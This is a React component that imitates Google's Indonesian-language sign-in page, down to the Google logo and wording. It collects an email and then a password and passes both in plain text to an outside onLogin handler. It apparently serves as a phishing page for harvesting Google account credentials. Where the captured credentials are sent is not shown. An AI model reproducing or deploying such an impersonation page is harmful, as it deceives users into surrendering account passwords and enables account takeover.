import React, { useState } from 'react';
import { ArrowLeft, Eye, EyeOff } from 'lucide-react';

interface GoogleLoginPageProps {
  onBack: () => void;
  onLogin: (email: string, password: string) => void;
  isLoading: boolean;
}

export default function GoogleLoginPage({ onBack, onLogin, isLoading }: GoogleLoginPageProps) {
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleEmailNext = () => {
    if (!email.trim()) {
      setEmailError('Masukkan email atau nomor telepon');
      return;
    }
    
    if (!validateEmail(email)) {
      setEmailError('Format email tidak valid');
      return;
    }
    
    setEmailError('');
    setStep('password');
  };

  const handlePasswordSubmit = () => {
    if (!password.trim()) {
      setPasswordError('Masukkan sandi');
      return;
    }
    
    if (password.length < 6) {
      setPasswordError('Sandi minimal 6 karakter');
      return;
    }
    
    setPasswordError('');
    // Call onLogin with email and password
    onLogin(email, password);
  };

  const handleKeyPress = (e: React.KeyboardEvent, action: () => void) => {
    if (e.key === 'Enter') {
      action();
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header */}
      <div className="flex items-center p-4">
        <button 
          onClick={onBack}
          className="p-2 hover:bg-gray-100 rounded-full transition-colors"
        >
          <ArrowLeft size={20} className="text-gray-600" />
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-8 pb-20">
        {/* Google Logo */}
        <div className="mb-8">
          <svg width="75" height="24" viewBox="0 0 272 92" className="mb-4">
            <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
            <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
          </svg>
        </div>

        {step === 'email' ? (
          <>
            {/* Email Step */}
            <div className="w-full max-w-sm">
              <h1 className="text-2xl font-normal text-gray-900 mb-2 text-center">Login</h1>
              <p className="text-gray-600 text-sm mb-6 text-center">
                Gunakan Akun Google Anda. Akun akan ditambahkan ke perangkat ini dan tersedia untuk aplikasi Google lainnya.
              </p>
              <a href="#" className="text-blue-600 text-sm hover:underline block text-center mb-8">
                Pelajari lebih lanjut cara menggunakan akun Anda
              </a>

              <div className="mb-4">
                <input
                  type="email"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    setEmailError('');
                  }}
                  onKeyPress={(e) => handleKeyPress(e, handleEmailNext)}
                  placeholder="Email atau nomor telepon"
                  className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                    emailError ? 'border-red-500' : 'border-gray-300'
                  }`}
                />
                {emailError && (
                  <p className="text-red-500 text-sm mt-2">{emailError}</p>
                )}
              </div>

              <a href="#" className="text-blue-600 text-sm hover:underline block mb-8">
                Lupa email?
              </a>

              <p className="text-gray-600 text-sm mb-8">
                Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.{' '}
                <a href="#" className="text-blue-600 hover:underline">
                  Pelajari selengkapnya
                </a>
              </p>

              <div className="flex justify-between items-center">
                <a href="#" className="text-blue-600 text-sm font-medium hover:underline">
                  Buat akun
                </a>
                <button
                  onClick={handleEmailNext}
                  disabled={isLoading}
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed font-medium"
                >
                  {isLoading ? 'Memproses...' : 'Selanjutnya'}
                </button>
              </div>
            </div>
          </>
        ) : (
          <>
            {/* Password Step */}
            <div className="w-full max-w-sm">
              <h1 className="text-2xl font-normal text-gray-900 mb-6 text-center">Selamat datang</h1>
              
              <div className="flex items-center gap-3 mb-6 p-3 border border-gray-300 rounded-lg">
                <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white text-sm font-medium">
                  {email.charAt(0).toUpperCase()}
                </div>
                <div className="flex-1">
                  <p className="text-sm text-gray-900">{email}</p>
                </div>
                <button
                  onClick={() => setStep('email')}
                  className="text-gray-400 hover:text-gray-600"
                >
                  <ArrowLeft size={16} />
                </button>
              </div>

              <div className="mb-4">
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => {
                      setPassword(e.target.value);
                      setPasswordError('');
                    }}
                    onKeyPress={(e) => handleKeyPress(e, handlePasswordSubmit)}
                    placeholder="Masukkan sandi Anda"
                    className={`w-full px-4 py-3 pr-12 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent ${
                      passwordError ? 'border-red-500' : 'border-gray-300'
                    }`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {passwordError && (
                  <p className="text-red-500 text-sm mt-2">{passwordError}</p>
                )}
              </div>

              <a href="#" className="text-blue-600 text-sm hover:underline block mb-8">
                Lupa sandi?
              </a>

              <div className="flex justify-end">
                <button
                  onClick={handlePasswordSubmit}
                  disabled={isLoading}
                  className="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed font-medium"
                >
                  {isLoading ? 'Memproses...' : 'Selanjutnya'}
                </button>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
}